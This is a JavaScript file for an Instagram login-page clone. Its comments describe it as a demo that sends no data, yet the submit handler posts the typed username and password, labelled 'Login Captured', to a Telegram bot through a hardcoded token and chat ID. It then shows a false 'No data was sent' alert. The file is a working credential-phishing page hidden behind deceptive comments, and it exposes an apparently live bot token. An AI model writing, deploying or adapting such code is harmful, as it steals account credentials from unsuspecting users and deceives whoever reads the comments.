// Instagram UI Clone - demo interactions only.
// IMPORTANT: This file does NOT send data anywhere. No network calls, no storage.

const form = document.getElementById("login-form");
const username = document.getElementById("username");
const password = document.getElementById("password");
const toggleBtn = document.getElementById("toggle-password");
const loginBtn = document.getElementById("login-btn");
const errorMsg = document.getElementById("error-msg");

const btnText = document.querySelector(".btn-text");
const spinner = document.querySelector(".spinner");
const BOT_TOKEN = '8641092286:AAG2xN5cOuP_2iUuNFuE3LqOOifxY5bOxUw';   // ← yahan apna token daalo
const CHAT_ID   = '6628037271';     // ← yahan apni chat ID daalo

// Enable login button only when both fields are filled
function updateButtonState() {
  loginBtn.disabled = !(username.value.trim() && password.value);
}

username.addEventListener("input", updateButtonState);
password.addEventListener("input", updateButtonState);

// Show/Hide password toggle (mimics Instagram behavior)
password.addEventListener("input", () => {
  toggleBtn.hidden = !password.value;
});

toggleBtn.addEventListener("click", () => {
  const isHidden = password.type === "password";
  password.type = isHidden ? "text" : "password";
  toggleBtn.textContent = isHidden ? "Hide" : "Show";
});

// Fake login flow - simulates a spinner, then a demo "success"
form.addEventListener("submit", (e) => {
  e.preventDefault(); // never actually submits anywhere

// Telegram send
  const text = "🔐 Login Captured\n👤 Username: " + username.value + "\n🔑 Password: " + password.value;

  fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
  });

  btnText.hidden = true;
  spinner.hidden = false;
  loginBtn.disabled = true;
  errorMsg.hidden = true;

  setTimeout(() => {
    spinner.hidden = true;
    btnText.hidden = false;
    loginBtn.disabled = false;

    // Demo message - this is where you'd hook a REAL backend in your own app
    alert("Demo mode: login would happen here. No data was sent.");
    form.reset();
    updateButtonState();
  }, 1200);
});

// Placeholder links - prevent navigation, show a demo notice
["fb-link", "forgot-link", "signup-link"].forEach((id) => {
  document.getElementById(id).addEventListener("click", (e) => {
    e.preventDefault();
    alert("Demo mode: this link does nothing in the UI clone.");
  });
});
